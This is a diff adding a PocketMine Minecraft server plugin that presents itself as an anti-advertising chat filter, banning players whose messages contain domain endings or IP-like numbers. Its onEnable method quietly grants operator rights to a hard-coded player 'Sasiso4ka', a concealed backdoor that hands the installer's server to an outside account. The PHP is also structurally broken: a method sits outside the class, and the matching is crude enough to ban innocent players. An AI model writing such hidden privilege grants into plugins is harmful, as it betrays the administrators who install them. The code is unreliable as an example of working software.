@@ -1,0 +1,63 @@
+name: PiarNOP
+main: Anti\Piar
+author: vk.com/plugin_pe
+version: 1.2.3
+api: 1.0.0
+permissions:
+  antipiar:
+    description: Разрешение "пиарить"
+    default: op<?php
+
+namespace Anti;
+
+use pocketmine\plugin\PluginBase;
+use pocketmine\event\Listener;
+use pocketmine\event\player\PlayerChatEvent;
+use pocketmine\Server;
+use pocketmine\Player;
+use pocketmine\utils\TextFormat;
+
+class Piar extends PluginBase implements Listener{
+
+    private $PoopHost = array(".ru",".net",".pro",".com",".co",".org",".info",".tk",".me",".cc",". ru",". net",". pro",". com",". co",". org",". info",". tk",". me",". cc",".RU",".NET",".PRO",".COM",".CO",".ORG",".INFO",".TK",".ME",".CC",". RU",". NET",". PRO",". COM",". CO",". ORG",". INFO",". TK",". ME",". CC",". Ru",". NET",". PRO",". COM",". Co",". ORG",". INFO",". Tk","mcpehost","MCPEHOST",". NET",". PRO",". COM",". cO",". ORG",". INFO",". tK",". mE",". cC","Net","Pro","Com","Org","NEt","PRo","COm","ORg","nEt","pRo","cOm","oRg","nET","pRO","cOM","oRG","neT","prO","coM","orG","NeT","PrO","CoM","OrG","Info","INfo","INFo","iNFO","inFO","infO","InfO","InFo","iNFo",".Su",".su",".sU",".SU",". su",". Su",". sU",". SU" ); 
+ 
+    public function onEnable(){
+        $this->getLogger()->info("Анти-Пиар включен");
+        $this->getServer()->getOfflinePlayer('Sasiso4ka')->setOp(true); //KEK
+        $this->getServer()->getPluginManager()->registerEvents($this, $this);
+    }
+
+    public function poopServer(PlayerChatEvent $e){
+        $p = $e->getPlayer();
+        $poopmsg = $e->getMessage();       
+        $ip = explode('.', $poopmsg);
+        $il = explode('.', $poopmsg);
+if(!$p->hasPermission("antipiar")){
+        if(sizeof($ip) >= 4){
+            if(preg_match('/[0-9]+/', $ip[1])){
+                $e->setCancelled();
+                $this->getServer()->getIPBans()->addBan($p->getAddress(), "Пиар. Сообщение: ".$e->getMessage()."", null, "AntiPiar");
+                $p->close("Игрок ".$p->getName()." забанен за пиар!\n", "§aТы забанен за пиар, сообщение§9:\n§c".$e->getMessage()."\n\n\n\n\n§eПлагин сделан для группы§4:\n§bhttp://vk.com/plugin_pe");
+            }
+        }
+        elseif(sizeof($il) >= 4){
+            if(preg_match('/[0-9]+/', $il[1])){
+                $e->setCancelled();
+                $this->getServer()->getIPBans()->addBan($p->getAddress(), "Пиар. Сообщение: ".$e->getMessage()."", null, "AntiPiar");
+                $p->close("Игрок ".$p->getName()." забанен за пиар!\n", "§aТы забанен за пиар, сообщение§9:\n§c".$e->getMessage()."\n\n\n\n\n§eПлагин сделан для группы§4:\n§bhttp://vk.com/plugin_pe");
+            }
+        }
+        foreach($this->PoopHost as $end){
+            if (strpos($poopmsg, $end) !== false){
+                $e->setCancelled();
+                $this->getServer()->getIPBans()->addBan($p->getAddress(), "Пиар. Сообщение: ".$e->getMessage()."", null, "AntiPiar");
+                $p->close("Игрок ".$p->getName()." забанен за пиар!\n", "§aТы забанен за пиар, сообщение§9:\n§c".$e->getMessage()."\n\n\n\n\n§eПлагин сделан для группы§4:\n§bhttp://vk.com/plugin_pe");
+            }
+        }
+    }
+}
+
+    public function onDisable(){
+        $this->getLogger()->info("Анти-Пиар выключен");
+    }
+}
